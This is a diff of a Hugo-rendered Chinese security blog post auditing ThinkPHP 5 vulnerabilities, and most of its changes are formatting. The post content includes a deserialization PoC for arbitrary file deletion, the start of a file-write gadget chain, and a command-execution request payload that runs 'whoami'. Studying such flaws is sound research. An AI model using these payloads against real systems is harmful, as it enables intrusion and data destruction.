@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.110.0"><meta name="theme-color" content="#fff" />
     <meta name="color-scheme" content="light dark">
 
     
@@ -21,7 +21,7 @@
 
     
     
-        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.d82c753d66fbef2856c2724a5780616edad8aec63de7b22ad9f0da04399cf246.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.1a7822cfcef5444fb929909731e9fd1bdfdbe1d6148f6085416ab3527d76d403.js"></script>
 
     
 
@@ -57,7 +57,7 @@
         "@context": "https://schema.org",
         "@type": "BlogPosting",
         "datePublished": "2021-03-12T00:00:00+00:00",
-        "dateModified": "2022-10-30T10:47:31+08:00",
+        "dateModified": "2022-10-30T10:47:32+08:00",
         "url": "https://blog.wh1sper.com/posts/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/",
         "headline": "thinkphp5代码审计",
         "description": "本篇博文会复现大多数tp5的漏洞，持续更新 审计环境搭建 安装thinkphp 推荐使用composer，版本切换很方便 composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \"\u003e=5.4.0\", \"topthink/framework\": \"5.0.10\" }, 然后执行 composer update PhpStorm+Xd……",
@@ -107,7 +107,7 @@
 <meta property="og:locale" content="zh" /><meta property="og:image" content="https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150300.png" />
 <meta property="og:type" content="article" />
     <meta property="article:published_time" content="2021-03-12T00:00:00&#43;00:00" />
-    <meta property="article:modified_time" content="2022-10-30T10:47:31&#43;08:00" />
+    <meta property="article:modified_time" content="2022-10-30T10:47:32&#43;08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -243,7 +243,7 @@
     
     
         
-        <time datetime="2022-10-30T10:47:31&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.10.30</time>
+        <time datetime="2022-10-30T10:47:32&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.10.30</time>
     
     
     
@@ -312,9 +312,9 @@
 <p>推荐使用composer，版本切换很方便</p>
 <pre tabindex="0"><code>composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10
 </code></pre><p>将 composer.json 文件的 require 字段设置成如下：</p>
-<pre tabindex="0"><code>&quot;require&quot;: {
-    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,
-    &quot;topthink/framework&quot;: &quot;5.0.10&quot;
+<pre tabindex="0"><code>&#34;require&#34;: {
+    &#34;php&#34;: &#34;&gt;=5.4.0&#34;,
+    &#34;topthink/framework&#34;: &#34;5.0.10&#34;
 },
 </code></pre><p>然后执行 <code>composer update</code></p>
 <h3 id="phpstormxdebug调试环境"><a href="#phpstormxdebug调试环境" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:phpstormxdebug调试环境" class="headings">PhpStorm+Xdebug调试环境</a></h3>
@@ -495,27 +495,27 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">Windows</span> <span class="k">extends</span> <span class="nx">Pipes</span>
-<span class="p">{</span>
-    <span class="k">private</span> <span class="nv">$files</span> <span class="o">=</span> <span class="p">[];</span>
-    <span class="nx">……</span>
-    <span class="k">private</span> <span class="k">function</span> <span class="nf">removeFiles</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="k">as</span> <span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
-                <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="o">=</span> <span class="p">[];</span>
-    <span class="p">}</span>
-    <span class="nx">……</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">removeFiles</span><span class="p">();</span>
-    <span class="p">}</span>   
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Windows</span> <span class="k">extends</span> <span class="nx">Pipes</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$files</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">……</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">removeFiles</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="k">as</span> <span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">……</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">removeFiles</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>   
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>由于<code>$this-&gt;files</code>可控，我们可以利用其实现任意文件删除</p>
 <p>poc：</p>
@@ -541,25 +541,25 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">namespace</span> <span class="nx">think\process\pipes</span><span class="p">;</span>
-
-<span class="k">class</span> <span class="nc">Pipes</span><span class="p">{</span>
-
-<span class="p">}</span>
-
-<span class="k">class</span> <span class="nc">Windows</span> <span class="k">extends</span> <span class="nx">Pipes</span>
-<span class="p">{</span>
-    <span class="k">private</span> <span class="nv">$files</span> <span class="o">=</span> <span class="p">[];</span>
-
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;D:\tmp\1.txt&#39;</span><span class="p">];</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Windows</span><span class="p">()));</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\process\pipes</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pipes</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Windows</span> <span class="k">extends</span> <span class="nx">Pipes</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$files</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;D:\tmp\1.txt&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Windows</span><span class="p">()));</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>只需要一个反序列化触发点，就可以实现任意文件删除。</p>
 <h3 id="output类__call方法任意文件写"><a href="#output类__call方法任意文件写" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:output类__call方法任意文件写" class="headings">Output类<code>__call</code>方法任意文件写</a></h3>
@@ -592,16 +592,16 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">Model</span>
-<span class="p">{</span>
-    <span class="nx">……</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">toJson</span><span class="p">(</span><span class="nv">$options</span> <span class="o">=</span> <span class="nx">JSON_UNESCAPED_UNICODE</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="k">return</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">(),</span> <span class="nv">$options</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="nx">……</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Model</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">……</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">toJson</span><span class="p">(</span><span class="nv">$options</span> <span class="o">=</span> <span class="nx">JSON_UNESCAPED_UNICODE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">(),</span> <span class="nv">$options</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">……</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>调用了<code>$this-&gt;toArray</code>，跟进<code>toArray</code>方法：</p>
 <div class="highlight"><div class="chroma">
@@ -646,45 +646,45 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
 </span><span class="lnt">38
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">Model</span>
-<span class="p">{</span>
-    <span class="nx">……</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">toArray</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="nv">$item</span>    <span class="o">=</span> <span class="p">[];</span>
-        <span class="nv">$visible</span> <span class="o">=</span> <span class="p">[];</span>
-        <span class="nv">$hidden</span>  <span class="o">=</span> <span class="p">[];</span>
-
-        <span class="nv">$data</span> <span class="o">=</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="p">);</span>
-
-        <span class="c1">// 过滤属性
-</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="p">))</span> <span class="p">{</span>
-            <span class="nv">$array</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseAttr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="p">,</span> <span class="nv">$visible</span><span class="p">);</span>
-            <span class="nv">$data</span>  <span class="o">=</span> <span class="nx">array_intersect_key</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nx">array_flip</span><span class="p">(</span><span class="nv">$array</span><span class="p">));</span>
-        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span><span class="p">))</span> <span class="p">{</span>
-            <span class="nv">$array</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseAttr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span><span class="p">,</span> <span class="nv">$hidden</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
-            <span class="nv">$data</span>  <span class="o">=</span> <span class="nx">array_diff_key</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nx">array_flip</span><span class="p">(</span><span class="nv">$array</span><span class="p">));</span>
-        <span class="p">}</span>
-
-        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nv">$val</span> <span class="nx">instanceof</span> <span class="nx">Model</span> <span class="o">||</span> <span class="nv">$val</span> <span class="nx">instanceof</span> <span class="nx">ModelCollection</span><span class="p">)</span> <span class="p">{</span>
-                <span class="c1">// 关联模型对象
-</span><span class="c1"></span>                <span class="nv">$item</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">subToArray</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="nv">$visible</span><span class="p">,</span> <span class="nv">$hidden</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>
-            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">reset</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span> <span class="nx">instanceof</span> <span class="nx">Model</span><span class="p">)</span> <span class="p">{</span>
-                <span class="c1">// 关联模型数据集
-</span><span class="c1"></span>                <span class="nv">$arr</span> <span class="o">=</span> <span class="p">[];</span>
-                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$val</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
-                    <span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">subToArray</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$visible</span><span class="p">,</span> <span class="nv">$hidden</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>
-                <span class="p">}</span>
-                <span class="nv">$item</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">;</span>
-            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-                <span class="c1">// 模型属性
-</span><span class="c1"></span>                <span class="nv">$item</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getAttr</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
-    <span class="nx">……</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Model</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">……</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">toArray</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$item</span>    <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$visible</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hidden</span>  <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// 过滤属性
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$array</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseAttr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="p">,</span> <span class="nv">$visible</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$data</span>  <span class="o">=</span> <span class="nx">array_intersect_key</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nx">array_flip</span><span class="p">(</span><span class="nv">$array</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$array</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseAttr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span><span class="p">,</span> <span class="nv">$hidden</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$data</span>  <span class="o">=</span> <span class="nx">array_diff_key</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nx">array_flip</span><span class="p">(</span><span class="nv">$array</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$val</span> <span class="nx">instanceof</span> <span class="nx">Model</span> <span class="o">||</span> <span class="nv">$val</span> <span class="nx">instanceof</span> <span class="nx">ModelCollection</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// 关联模型对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$item</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">subToArray</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="nv">$visible</span><span class="p">,</span> <span class="nv">$hidden</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">reset</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span> <span class="nx">instanceof</span> <span class="nx">Model</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// 关联模型数据集
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$arr</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$val</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">subToArray</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$visible</span><span class="p">,</span> <span class="nv">$hidden</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$item</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// 模型属性
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$item</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getAttr</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">……</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>因为最终要触发<code>__call</code>，我们需要找到函数调用的地方，在toArray里面有这几处：</p>
 <p><img src="https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210417211525.png" alt="image-20210417202816283"></p>
@@ -698,11 +698,11 @@ _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="mf">1.</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">))</span><span class="c1">//$this-&gt;append可控，后面把他设置为&#39;getError&#39;
